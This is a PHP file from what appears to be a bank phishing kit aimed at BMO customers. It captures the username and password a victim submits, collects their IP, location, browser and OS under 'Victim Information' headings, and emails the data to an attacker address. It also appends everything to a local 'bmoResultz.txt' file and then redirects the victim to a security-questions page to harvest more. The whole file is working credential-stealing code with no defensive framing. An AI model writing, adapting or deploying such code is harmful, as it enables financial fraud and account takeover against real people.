<?php
require "../../../CONTROLS.php";
require "../includes/session_protect.php";
require "../includes/functions.php";
require "../includes/One_Time.php";
ini_set('display_errors', 0);


        $date = date('l d F Y');
        $time = date('H:i');
        $USER = $_POST['UN'];
		$PASS = $_POST['PW'];
        $ip = $_SERVER['REMOTE_ADDR'];
        $systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
        $VictimInfo1 = "IP 			: " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
        $VictimInfo2 = "LOCATION	: " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
        $VictimInfo3 = "USERAGENT	: " . $systemInfo['useragent'] . "";
        $VictimInfo4 = "BROWSER		: " . $systemInfo['browser'] . "";
        $VictimInfo5 = "OS			: " . $systemInfo['os'] . "";
        $data = "
+ ------------- 1 LOGINDetails -----------------+
| USER		: $USER
| PASS		: $PASS
+ -------created by medpage[679849675]----------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ----------------------------------------------+
";


        $subject = "bmoResultz 1 " . $systemInfo['country'];
        mail($receiverAddress, $subject, $data);

$fp = fopen('../../../bmoResultz.txt', 'a');
fwrite($fp, $data);
fclose($fp);
?>
<script type="text/javascript">
    window.top.location.href = "secquestions.php";

</script>